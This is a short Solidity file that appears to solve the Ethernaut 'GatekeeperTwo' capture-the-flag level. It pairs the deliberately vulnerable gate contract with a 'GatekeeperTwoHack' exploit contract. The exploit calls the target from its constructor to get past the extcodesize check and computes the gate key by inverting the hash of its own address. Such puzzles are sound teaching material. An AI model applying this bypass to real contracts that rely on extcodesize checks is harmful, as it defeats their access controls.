// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "hardhat/console.sol";

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        console.log("GATE ONE UNLOCKED");
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        console.log("GATE TWO UNLOCKED");
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^
                uint64(_gateKey) ==
                uint64(0) - 1
        );
        console.log("GATE THREE UNLOCKED");
        _;
    }

    function enter(bytes8 _gateKey)
        public
        gateOne
        gateTwo
        gateThree(_gateKey)
        returns (bool)
    {
        entrant = tx.origin;
        return true;
    }
}

contract GatekeeperTwoHack {
    GatekeeperTwo private gateKeeper;

    constructor(address _gateKeeper) public {
        gateKeeper = GatekeeperTwo(_gateKeeper);
        bytes8 key = bytes8(~uint64(bytes8(keccak256(abi.encodePacked(this)))));

        gateKeeper.enter(key);
    }
}
